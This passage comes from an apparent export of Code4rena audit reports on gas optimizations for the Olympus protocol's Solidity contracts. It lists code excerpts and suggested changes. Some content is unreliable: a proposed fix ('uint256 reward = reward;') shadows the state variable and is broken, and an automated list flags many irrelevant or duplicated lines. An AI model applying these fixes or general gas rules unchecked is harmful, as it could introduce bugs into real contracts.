by a new activated proposal.    127    uint256 public constant GRACE_PERIOD = 1 weeks;    128    129    /// @notice Endorsements required to activate a proposal as percentage of total supply.    130    uint256 public constant ENDORSEMENT_THRESHOLD = 20;    131    132    /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.    133    uint256 public constant EXECUTION_THRESHOLD = 33;    134    135    /// @notice Required time for a proposal to be active before it can be executed.    136    /// @dev    This amount should be greater than 0 to prevent flash loan attacks.    137    uint256 public constant EXECUTION_TIMELOCK = 3 days;    ```     - src/policies/Operator.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89)     ```solidity    89     uint32 public constant FACTOR_SCALE = 1e4;    ```     - src/modules/RANGE.sol:[65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L65)     ```solidity    65     uint256 public constant FACTOR_SCALE = 1e4;    ```  4. **Use elementary types or a user-defined `type` instead of a `struct` that has only one member. (1 instances)**     Deployment Gas Saved: **30 714**    Method Call Gas Saved: **1 037**     - src/modules/RANGE.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L33-L35)     ```solidity    33     struct Line {    34         uint256 price; // Price for the specified level    35     }    ```  5. **State variables should be cached in stack variables rather than re-reading them from storage**     Deployment Gas Saved: **24 021**    Method Call Gas Saved: **614**     SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.     - src/policies/Heart.sol:[112-113](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L112-L113)     ```solidity    112        rewardToken.safeTransfer(to_, reward);    113        emit RewardIssued(to_, reward);    ```     fix:     ```solidity            uint256 reward = reward;            rewardToken.safeTransfer(to_, reward);            emit RewardIssued(to_, reward);    ```     - src/policies/BondCallback.sol:[68-75](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L68-L75)     ```solidity    68         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();    69         Keycode MINTR_KEYCODE = MINTR.KEYCODE();    70    71         requests = new Permissions[](4);    72         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);    73         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.withdrawReserves.selector);    74         requests[2] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);    75         requests[3] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);    ```     fix(similar for other policies):     ```solidity        OlympusTreasury ltrsry = TRSRY;        OlympusMinter lmintr = MINTR;        Keycode TRSRY_KEYCODE = ltrsry.KEYCODE();        Keycode MINTR_KEYCODE = lmintr.KEYCODE();         requests = new Permissions[](4);         requests[0] = Permissions(TRSRY_KEYCODE, ltrsry.setApprovalFor.selector);        requests[1] = Permissions(TRSRY_KEYCODE, ltrsry.withdrawReserves.selector);        requests[2] = Permissions(MINTR_KEYCODE, lmintr.mintOhm.selector);        requests[3] = Permissions(MINTR_KEYCODE, lmintr.burnOhm.selector);    ```     - src/policies/Governance.sol:[77-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L77-L79)     ```solidity    77         requests = new Permissions[](2);    78         requests[0] = Permissions(INSTR.KEYCODE(), INSTR.store.selector);    79         requests[1] = Permissions(VOTES.KEYCODE(), VOTES.transferFrom.selector);    ```     - src/policies/Operator.sol:[172-185](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L172-L185)     ```solidity    172        Keycode RANGE_KEYCODE = RANGE.KEYCODE();    173        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();    174        Keycode MINTR_KEYCODE = MINTR.KEYCODE();    175    176        requests = new Permissions[](9);    177        requests[0] = Permissions(RANGE_KEYCODE, RANGE.updateCapacity.selector);    178        requests[1] = Permissions(RANGE_KEYCODE, RANGE.updateMarket.selector);    179        requests[2] = Permissions(RANGE_KEYCODE, RANGE.updatePrices.selector);    180        requests[3] = Permissions(RANGE_KEYCODE, RANGE.regenerate.selector);    181        requests[4] = Permissions(RANGE_KEYCODE, RANGE.setSpreads.selector);    182        requests[5] = Permissions(RANGE_KEYCODE, RANGE.setThresholdFactor.selector);    183        requests[6] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);    184        requests[7] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);    185        requests[8] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);    ```     - src/policies/PriceConfig.sol:[32-34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34)     ```solidity    32        permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector);    33        permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector);    34        permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);    ```     - src/policies/TreasuryCustodian.sol:[35-39](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L35-L39)     ```solidity    35        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();    36    37        requests = new Permissions[](2);    38        requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);    39        requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.setDebt.selector);    ```     - src/policies/VoterRegistration.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L34-L35)     ```solidity    33        permissions = new Permissions[](2);    34        permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector);    35        permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);    ```  6. **Using bools for storage incurs overhead (6 instances)**     Deployment Gas Saved: **23 611**    Method Call Gas Saved: **4 485**     ```    // Booleans are more expensive than uint256 or any type that takes up a full    // word because each write operation emits an extra SLOAD to first read the    // slot's contents, replace the bits taken up by the boolean, and then write    // back. This is the compiler's defense against contract upgrades and    // pointer aliasing, and it cannot be disabled.    ```     Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past     **Important**: This rule doesn't always work, sometimes a bool is packed with another variable in the same slot, sometimes it's packed into a struct, sometimes the optimizer makes bool more efficient. You can see the @note in the code for each case     - src/Kernel.sol:[181](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L181), [194](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L194), [197](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L197)     ```solidity    181    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; //@note D:3200 M:1754    ...    194    mapping(address => mapping(Role => bool)) public hasRole; //@note D:\u22123016 M:2298    ...    197    mapping(Role => bool) public isRole; //@note D:2407    ```     - src/policies/Governance.sol:[105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105), [117](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117),     ```solidity    105    mapping(uint256 => bool) public proposalHasBeenActivated; //@note D:3007    ...    117    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; //@note D:3007    ```     - src/modules/PRICE.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62)     ```solidity    62     bool public initialized; //@note D:11813    ```     **Expensive method calls**:     It's just to show which bool is better left in the code     - src/policies/Operator.sol     ```solidity    63     bool public initialized; //@note D:5808 M:-22036    ...    66     bool public active; //@note D:-32775 M:-48896    ```     - src/policies/Heart.sol     ```solidity    33     bool public active; //@note D:-382    ```     - src/policies/BondCallback.sol     ```solidity    24     mapping(address => mapping(uint256 => bool)) public approvedMarkets; //@note D:-44192    ```     - src/Kernel.sol     ```solidity    113    bool public isActive; //@note D:20923 M:-247184    ```  7. **State variables can be packed into fewer storage slots (3 instances)**     If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper     **NOTE**: one slot = 32 bytes     Deployment Gas Saved: **23 292**    Method Call Gas Saved: **1 711**     - src/policies/Heart.sol:[32-48](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48)     uint256(32), address(20), bool(1)     ```solidity    32     /// @notice Status of the Heart, false = stopped, true = beating    33     bool public active; // @note put below _operator    34    35     /// @notice Timestamp of the last beat (UTC, in seconds)    36     uint256 public lastBeat;    37    38     /// @notice Reward for beating the Heart (in reward token decimals)    39     uint256 public reward;    40    41     /// @notice Reward token address that users are sent for beating the Heart    42     ERC20 public rewardToken;    43    44     // Modules    45     OlympusPrice internal PRICE;    46    47     // Policies    48     IOperator internal _operator;    ```     fix:     ```solidity    uint256 public lastBeat;    uint256 public reward;    ERC20 public rewardToken;    OlympusPrice internal PRICE;    IOperator internal _operator;    bool public active;    ```     - src/modules/PRICE.sol:[31-65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L31-L65)     **NOTE**: PRICE is Module, Module is KernelAdapter, so real first variable in PRICE is kernel from KernelAdapter     uint256(32), uint32(4), uint48(6), uint8(1), array(32), address(20), bool(1)     ```solidity    inherit Kernel public kernel;    ...    31     /// @dev    Price feeds. Chainlink typically provides price feeds for an asset in ETH. Therefore, we use two price feeds against ETH, one for OHM and one for the Reserve asset, to calculate the relative price of OHM in the Reserve asset.    32     AggregatorV2V3Interface internal immutable _ohmEthPriceFeed;    33     AggregatorV2V3Interface internal immutable _reserveEthPriceFeed;    34    35     /// @dev Moving average data    36     uint256 internal _movingAverage; /// See getMovingAverage()    37    38     /// @notice Array of price observations. Check nextObsIndex to determine latest data point.    39     /// @dev    Observations are stored in a ring buffer where the moving average is the sum of all observations divided by the number of observations.    40     ///         Observations can be cleared by changing the movingAverageDuration or observationFrequency and must b"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/29", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## gas optimization ### G01: COMPARISONS WITH ZERO FOR UNSIGNED INTEGERS #### problem 0 is less gas efficient than !0 if you enable the optimizer at 10k AND you\u2019re in a require statement. Detailed explanation with the opcodes https://twitter.com/gzeon/status/1485428085885640706 #### prof policies/Governance.sol, 247, b'        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\\r'  ### G02: PREFIX INCREMENT SAVE MORE GAS #### problem prefix increment ++i is more cheaper than postfix i++ #### prof policies/Operator.sol, 488, b'            decimals++;\\r' policies/Operator.sol, 675, b'                _status.low.count--;\\r' policies/Operator.sol, 670, b'                _status.low.count++;\\r' policies/Operator.sol, 691, b'                _status.high.count--;\\r' policies/Operator.sol, 686, b'                _status.high.count++;\\r'   ### G03: X += Y COSTS MORE GAS THAN X = X + Y FOR STATE VARIABLES #### prof policies/BondCallback.sol, 143, b'        _amountsPerMarket[id_][0] += inputAmount_;\\r' policies/BondCallback.sol, 144, b'        _amountsPerMarket[id_][1] += outputAmount_;\\r' policies/Governance.sol, 194, b'        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;\\r' policies/Governance.sol, 198, b'        totalEndorsementsForProposal[proposalId_] += userVotes;\\r' policies/Governance.sol, 254, b'            noVotesForProposal[activeProposal.proposalId] += userVotes;\\r' policies/Governance.sol, 252, b'            yesVotesForProposal[activeProposal.proposalId] += userVotes;\\r' policies/Heart.sol, 103, b'        lastBeat += frequency();\\r' modules/PRICE.sol, 138, b'            _movingAverage -= (earliestPrice - currentPrice) / numObs;' modules/PRICE.sol, 136, b'            _movingAverage += (currentPrice - earliestPrice) / numObs;' modules/TRSRY.sol, 96, b'        reserveDebt[token_][msg.sender] += amount_;\\r' modules/TRSRY.sol, 97, b'        totalDebt[token_] += amount_;\\r' modules/TRSRY.sol, 115, b'        reserveDebt[token_][msg.sender] -= received;\\r' modules/TRSRY.sol, 116, b'        totalDebt[token_] -= received;\\r' modules/TRSRY.sol, 132, b'        else totalDebt[token_] -= oldDebt - amount_;\\r' modules/TRSRY.sol, 131, b'        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;\\r'  ### G04: USING BOOLS FOR STORAGE INCURS OVERHEAD #### problem // Booleans are more expensive than uint256 or any type that takes up a full // word because each write operation emits an extra SLOAD to first read the // slot's contents, replace the bits taken up by the boolean, and then write // back. This is the compiler's defense against contract upgrades and // pointer aliasing, and it cannot be disabled. #### prof policies/Governance.sol, 105, b'    mapping(uint256 => bool) public proposalHasBeenActivated;\\r' policies/Governance.sol, 117, b'    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;\\r' Kernel.sol, 181, b'    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;\\r' Kernel.sol, 194, b'    mapping(address => mapping(Role => bool)) public hasRole;\\r' Kernel.sol, 197, b'    mapping(Role => bool) public isRole;\\r'  ### G05: resign the default value to the variables. #### problem  resign the default value to the variables will cost more gas. #### prof Kernel.sol, 397, b'        for (uint256 i = 0; i < reqLength; ) {\\r'  ## G06: ++I/I++ SHOULD BE UNCHECKED{++I}/UNCHECKED{I++} WHEN IT IS NOT POSSIBLE FOR THEM TO OVERFLOW, AS IS THE CASE WHEN USED IN FOR- AND WHILE-LOOPS #### problem The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas per loop #### prof modules/INSTR.sol, 44, b'        uint256 instructionsId = ++totalInstructions;\\r' policies/Operator.sol, 488, b'            decimals++;\\r' policies/Operator.sol, 675, b'                _status.low.count--;\\r' policies/Operator.sol, 670, b'                _status.low.count++;\\r' policies/Operator.sol, 691, b'                _status.high.count--;\\r' policies/Operator.sol, 686, b'                _status.high.count++;\\r'   ### G07: FUNCTIONS GUARANTEED TO REVERT WHEN CALLED BY NORMAL USERS CAN BE MARKED PAYABLE #### problem If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost #### prof policies/Heart.sol, 132, b'    function resetBeat() external onlyRole(\"heart_admin\") ' policies/Heart.sol, 132, b'    function resetBeat() external onlyRole(\"heart_admin\") ' policies/Heart.sol, 137, b'    function toggleBeat() external onlyRole(\"heart_admin\") ' policies/Heart.sol, 137, b'    function toggleBeat() external onlyRole(\"heart_admin\") ' policies/Heart.sol, 147, b'    function setRewardTokenAndAmount(ERC20 token_, uint256 reward_)\\r\\n        external\\r\\n        onlyRole(\"heart_admin\")\\r\\n    ' policies/Heart.sol, 152, b'    function withdrawUnspentRewards(ERC20 token_) external onlyRole(\"heart_admin\") ' policies/Heart.sol, 152, b'    function withdrawUnspentRewards(ERC20 token_) external onlyRole(\"heart_admin\") ' Kernel.sol, 260, b'    function executeAction(Actions action_, address target_) external onlyExecutor ' Kernel.sol, 448, b'    function grantRole(Role role_, address addr_) public onlyAdmin ' Kernel.sol, 448, b'    function grantRole(Role role_, address addr_) public onlyAdmin ' Kernel.sol, 458, b'    function revokeRole(Role role_, address addr_) public onlyAdmin ' Kernel.sol, 458, b'    function revokeRole(Role role_, address addr_) public onlyAdmin ' policies/Operator.sol, 595, b'    function setBondContracts(IBondAuctioneer auctioneer_, IBondCallback callback_)\\r\\n        external\\r\\n        onlyRole(\"operator_admin\")\\r\\n    ' policies/Operator.sol, 615, b'    function initialize() external onlyRole(\"operator_admin\") ' policies/Operator.sol, 615, b'    function initialize() external onlyRole(\"operator_admin\") ' policies/Operator.sol, 621, b'    function regenerate(bool high_) external onlyRole(\"operator_admin\") ' policies/Operator.sol, 621, b'    function regenerate(bool high_) external onlyRole(\"operator_admin\") ' policies/Operator.sol, 627, b'    function toggleActive() external onlyRole(\"operator_admin\") ' policies/Operator.sol, 627, b'    function toggleActive() external onlyRole(\"operator_admin\") ' policies/PriceConfig.sol, 50, b'    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)\\r\\n        external\\r\\n        onlyRole(\"price_admin\")\\r\\n    ' policies/PriceConfig.sol, 63, b'    function changeMovingAverageDuration(uint48 movingAverageDuration_)\\r\\n        external\\r\\n        onlyRole(\"price_admin\")\\r\\n    ' policies/PriceConfig.sol, 74, b'    function changeObservationFrequency(uint48 observationFrequency_)\\r\\n        external\\r\\n        onlyRole(\"price_admin\")\\r\\n    ' policies/VoterRegistration.sol, 48, b'    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") ' policies/VoterRegistration.sol, 48, b'    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") ' policies/VoterRegistration.sol, 56, b'    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") ' policies/VoterRegistration.sol, 56, b'    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") '   ### G08: USING PRIVATE RATHER THAN PUBLIC FOR CONSTANTS, SAVES GAS #### problem: We can save getter function of public constants. #### prof: policies/Governance.sol, 121, b'    uint256 public constant SUBMISSION_REQUIREMENT = 100;\\r' policies/Governance.sol, 124, b'    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;\\r' policies/Governance.sol, 127, b'    uint256 public constant GRACE_PERIOD = 1 weeks;\\r' policies/Governance.sol, 130, b'    uint256 public constant ENDORSEMENT_THRESHOLD = 20;\\r' policies/Governance.sol, 133, b'    uint256 public constant EXECUTION_THRESHOLD = 33;\\r' policies/Governance.sol, 137, b'    uint256 public constant EXECUTION_TIMELOCK = 3 days;\\r' modules/MINTR.sol, 9, b'    OHM public immutable ohm;\\r' policies/Operator.sol, 82, b'    ERC20 public immutable ohm;\\r' policies/Operator.sol, 83, b'    uint8 public immutable ohmDecimals;\\r' policies/Operator.sol, 85, b'    ERC20 public immutable reserve;\\r' policies/Operator.sol, 86, b'    uint8 public immutable reserveDecimals;\\r' policies/Operator.sol, 89, b'    uint32 public constant FACTOR_SCALE = 1e4;\\r' modules/PRICE.sol, 59, b'    uint8 public constant decimals = 18;' modules/RANGE.sol, 65, b'    uint256 public constant FACTOR_SCALE = 1e4;\\r' modules/RANGE.sol, 68, b'    ERC20 public immutable ohm;\\r' modules/RANGE.sol, 71, b'    ERC20 public immutable reserve;\\r'   ### G09: USAGE OF UINTS/INTS SMALLER THAN 32 BYTES (256 BITS) INCURS OVERHEAD #### problem When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. #### prof policies/Governance.sol, 164, b'        if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT)\\r' policies/Governance.sol, 183, b'        if (proposalId_ == 0) {\\r' policies/Governance.sol, 188, b'        if (instructions.length == 0) {\\r' policies/Governance.sol, 243, b'        if (activeProposal.proposalId == 0) {\\r' policies/Governance.sol, 247, b'        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\\r' policies/Governance.sol, 268, b'        if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) {\\r' policies/Governance.sol, 298, b'        if (userVotes == 0) {\\r' policies/Heart.sol, 122, b'        return uint256(PRICE.observationFrequency());\\r' policies/Heart.sol, 122, b'        return uint256(PRICE.observationFrequency());\\r' modules/INSTR.sol, 29, b'        return (1, 0);\\r' modules/INSTR.sol, 48, b'        if (length == 0) revert INSTR_InstructionsCannotBeEmpty();\\r' modules/INSTR.sol, 61, b'            } else if (instruction.action == Actions.ChangeExecutor && i != length - 1) {\\r' modules/INSTR.sol, 70, b'            instructions.push(instructions_[i]);\\r' modules/INSTR.sol, 70, b'            instructions.push(instructions_[i]);\\r' Kernel.sol, 133, b'        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);\\r' Kernel.sol, 269, b'        if (address(getModuleForKeycode[keycode]) != address(0))\\r' Kernel.sol, 274, b'        allKeycodes.push(keycode);\\r' Kernel.sol, 283, b'        if (address(oldModule) == address(0) || oldModule == newModule_)\\r' Kernel.sol, 299, b'        activePolicies.push(policy_);\\r' Kernel.sol, 309, b'            moduleDependents[keycode].push(policy_);\\r' Kernel.sol, 337, b'        activePolicies.pop();\\r' Kernel.sol, 397, b'        for (uint256 i = 0; i < reqLength; ) {\\r' Kernel.sol, 422, b'            dependents.pop();\\r' Kernel.sol, 422, b'            dependents.pop();\\r' modules/MINTR.sol, 26, b'        return (1, 0);\\r' policies/Operator.sol, 72, b'    OlympusMinter internal MINTR;\\r' policies/Operator.sol, 83, b'    uint8 public immutable ohmDecimals;\\r' policies/Operator.sol, 86, b'    uint8 public immutable reserveDecimals;\\r' policies/Operator.sol, 89, b'    uint32 public constant FACTOR_SCALE = 1e4;\\r' policies/Operator.sol, 164, b'        MINTR = OlympusMinter(getModuleAddress(dependencies[3]));\\r' policies/Operator.sol, 167, b'        ohm.safeApprove(address(MINTR), type(uint256).max);\\r' policies/Operator.sol, 174, b'        Keycode MINTR_KEYCODE = MINTR.KEYCODE();\\r' policies/Operator.sol, 202, b'        _updateCapacity(true, 0);\\r' policies/Operator.sol, 203, b'        _updateCapacity(false, 0);\\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 211, b'            _status.high.count >= config_.regenThreshold\\r' policies/Operator.sol, 211, b'            _status.high.count >= config_.regenThreshold\\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\\r' policies/Operator.sol, 217, b'            _status.low.count >= config_.regenThreshold\\r' policies/Operator.sol, 217, b'            _status.low.count >= config_.regenThreshold\\r' policies/Operator.sol, 333, b'            MINTR.mintOhm(msg.sender, amountOut);\\r' policies/Operator.sol, 302, b'            MINTR.burnOhm(address(this), amountIn_);\\r' policies/Operator.sol, 418, b'            uint8 oracleDecimals = PRICE.decimals();\\r' policies/Operator.sol, 418, b'            uint8 oracleDecimals = PRICE.decimals();\\r' policies/Operator.sol, 418, b'            uint8 oracleDecimals = PRICE.decimals();\\r' policies/Operator.sol, 419, b'            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;\\r' policies/Operator.sol, 419, b'            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;\\r' policies/Operator.sol, 420, b'            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;\\r' policies/Operator.sol, 420, b'            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;\\r' policies/Operator.sol, 426, b'            int8 priceDecimals = _getPriceDecimals(invCushionPrice);\\r' policies/Operator.sol, 426, b'            int8 priceDecimals = _getPriceDecimals(invCushionPrice);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\\r' policies/Operator.sol, 431, b'            uint256 bondScale = 10 **\\r' policies/Operator.sol, 434, b'                uint8(\\r\\n                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r\\n                );\\r' policies/Operator.sol, 432, b'                uint8(\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\\r' policies/Operator.sol, 443, b'            uint256 marketCapacity = range.low.capacity.mulDiv(config_.cushionFactor, FACTOR_SCALE);\\r' policies/Operator.sol, 443, b'            uint256 marketCapacity = range.low.capacity.mulDiv(config_.cushionFactor, FACTOR_SCALE);\\r' policies/Operator.sol, 446, b'            IBondAuctioneer.MarketParams memory params = IBondAuctioneer.MarketParams({\\r' policies/Operator.sol, 454, b'                debtBuffer: config_.cushionDebtBuffer,\\r' policies/Operator.sol, 455, b'                vesting: uint48(0), // Instant swaps\\r' policies/Operator.sol, 455, b'                vesting: uint48(0), // Instant swaps\\r' policies/Operator.sol, 455, b'                vesting: "}, {"title": "QA Report", "html_url": 